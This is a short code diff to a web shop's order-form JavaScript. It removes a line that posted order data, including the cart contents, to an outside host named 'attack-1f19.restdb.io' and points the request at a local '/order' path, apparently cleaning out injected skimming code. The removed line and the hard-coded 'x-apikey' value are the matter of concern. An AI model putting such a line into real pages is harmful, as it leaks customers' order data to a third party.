@@ -104,7 +104,7 @@ document.getElementById('order-form').addEventListener('submit', function(e) {
         "products": localStorage.getItem('cart')
       });
       var xhr = new XMLHttpRequest();
-      xhr.open("POST", url + "https://attack-1f19.restdb.io/rest");
+      xhr.open("POST", url + "/order");
       xhr.setRequestHeader("content-type", "application/json");
       xhr.setRequestHeader("x-apikey", "6768232ee705334d8c3584ec");
       xhr.setRequestHeader("cache-control", "no-cache");
